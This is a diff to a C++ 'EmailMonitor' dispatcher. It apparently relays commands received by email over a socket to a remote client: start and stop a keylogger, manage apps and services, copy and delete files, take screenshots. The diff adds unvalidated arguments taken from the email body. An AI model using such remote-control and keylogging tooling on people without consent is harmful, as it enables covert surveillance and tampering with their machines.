@@ -53,11 +53,14 @@ void EmailMonitor::initializeWhiteList()
         std::cout << "Email body: " << email.body << "\n"; 
         sendMessage("RESET", clientSocket);
     }},
-    {"KEYLOGGER", [this](const email& email, const SOCKET& clientSocket) { 
+    {"STARTKEYLOGGER", [this](const email& email, const SOCKET& clientSocket) { 
         std::cout << "Executing Command 1\n";
         std::cout << "Email body: " << email.body << "\n"; 
         sendMessage("KEYLOGGER", clientSocket);
-        std::this_thread::sleep_for(std::chrono::seconds(10));
+    }},
+    {"STOPKEYLOGGER", [this](const email& email, const SOCKET& clientSocket) { 
+        std::cout << "Executing Command 1\n";
+        std::cout << "Email body: " << email.body << "\n"; 
         sendMessage("STOP", clientSocket);
     }},
     {"LISTAPP", [this](const email& email, const SOCKET& clientSocket) { 
@@ -68,12 +71,29 @@ void EmailMonitor::initializeWhiteList()
     {"STARTAPP", [this](const email& email, const SOCKET& clientSocket) { 
         std::cout << "Executing Command 1\n";
         std::cout << "Email body: " << email.body << "\n"; 
-        sendMessage("STARTAPP", clientSocket);
+        std::istringstream stream(email.body);
+        std::string firstLine;
+        std::getline(stream, firstLine);
+        trimEnd(firstLine);
+        std::string secondLine;
+        std::getline(stream, secondLine);
+        std::getline(stream, secondLine);
+        trimEnd(secondLine);
+        secondLine = "STARTAPP " + secondLine;
+        sendMessage(secondLine, clientSocket);
     }},
     {"STOPAPP", [this](const email& email, const SOCKET& clientSocket) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("STOPAPP", clientSocket);
+        std::istringstream stream(email.body);
+        std::string firstLine;
+        std::getline(stream, firstLine);
+        trimEnd(firstLine);
+        std::string secondLine;
+        std::getline(stream, secondLine);
+        std::getline(stream, secondLine);
+        trimEnd(secondLine);
+        sendMessage("STOPAPP " + secondLine, clientSocket);
     }},
     {"LISTSERVICES", [this](const email& email, const SOCKET& clientSocket) { 
         std::cout << "Executing Command 2\n"; 
@@ -83,22 +103,52 @@ void EmailMonitor::initializeWhiteList()
     {"STARTSERVICES", [this](const email& email, const SOCKET& clientSocket) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("STARTSERVICES", clientSocket);
+        std::istringstream stream(email.body);
+        std::string firstLine;
+        std::getline(stream, firstLine);
+        trimEnd(firstLine);
+        std::string secondLine;
+        std::getline(stream, secondLine);
+        std::getline(stream, secondLine);
+        trimEnd(secondLine);
+        sendMessage("STARTSERVICES " + secondLine, clientSocket);
     }},
     {"STOPSERVICES", [this](const email& email, const SOCKET& clientSocket) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("STOPSERVICES", clientSocket);
+        std::istringstream stream(email.body);
+        std::string firstLine;
+        std::getline(stream, firstLine);
+        trimEnd(firstLine);
+        std::string secondLine;
+        std::getline(stream, secondLine);
+        std::getline(stream, secondLine);
+        trimEnd(secondLine);
+        sendMessage("STOPSERVICES " + secondLine, clientSocket);
     }},
     {"COPYFILE", [this](const email& email, const SOCKET& clientSocket) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("COPYFILE", clientSocket);
+        std::istringstream stream(email.body);
+        std::string firstLine;
+        std::getline(stream, firstLine);
+        trimEnd(firstLine);
+        std::string secondLine;
+        std::getline(stream, secondLine);
+        trimEnd(secondLine);
+        sendMessage("COPYFILE " + secondLine, clientSocket);
     }},
-    {"REMOVEFILE", [this](const email& email, const SOCKET& clientSocket) { 
+    {"DELETEFILE", [this](const email& email, const SOCKET& clientSocket) { 
         std::cout << "Executing Command 2\n"; 
         std::cout << "Email body: " << email.body << "\n";
-        sendMessage("REMOVEFILE", clientSocket);
+        std::istringstream stream(email.body);
+        std::string firstLine;
+        std::getline(stream, firstLine);
+        trimEnd(firstLine);
+        std::string secondLine;
+        std::getline(stream, secondLine);
+        trimEnd(secondLine);
+        sendMessage("DELETEFILE " + secondLine, clientSocket);
     }},
     {"SCREENSHOT", [this](const email& email, const SOCKET& clientSocket) { 
         std::cout << "Executing Command 2\n"; 
